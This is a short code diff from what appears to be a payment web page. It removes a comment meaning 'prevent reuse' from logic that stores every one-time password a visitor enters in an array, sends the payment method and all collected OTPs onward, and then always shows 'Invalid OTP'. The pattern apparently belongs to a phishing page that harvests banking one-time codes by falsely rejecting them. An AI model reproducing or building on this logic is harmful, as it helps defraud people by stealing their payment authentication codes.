@@ -119,7 +119,6 @@ allOtps.push(otp)
           paymentMethod,allOtps,otp
         })
 
-        // 🔒 منع إعادة الاستخدام
         localStorage.setItem(`used_${visitorID}`, "true")
         alert('Invalid OTP')
       }}
